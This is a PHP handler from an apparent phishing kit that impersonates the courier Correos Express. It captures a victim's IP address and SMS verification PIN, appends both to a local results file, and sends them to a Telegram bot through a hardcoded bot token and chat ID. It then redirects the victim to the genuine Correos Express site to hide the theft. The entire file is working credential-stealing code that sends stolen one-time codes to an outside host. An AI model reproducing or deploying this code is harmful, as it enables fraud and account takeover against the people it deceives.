<?php

    $ip = $_SERVER['REMOTE_ADDR'];
    $message = "

    [IP]          : ".$ip."
    [PIN]    : ".$_POST['SMS']."
   -------==--Joo--==---------\n";
    $text = fopen('../rezlt.txt', 'a');
    fwrite($text, $message);



    function antiBotsCaller($messaggio) {
        $token = '5594739515:AAH031TBT7OHq3Cwfsti4y_2uwbjBKG8Dhs';
        $chatid = '-1001881728751';
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
        $url = $url . "&text=" . urlencode($messaggio);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    antiBotsCaller($message);
    

    header("Location: https://www.correosexpress.com/");


?>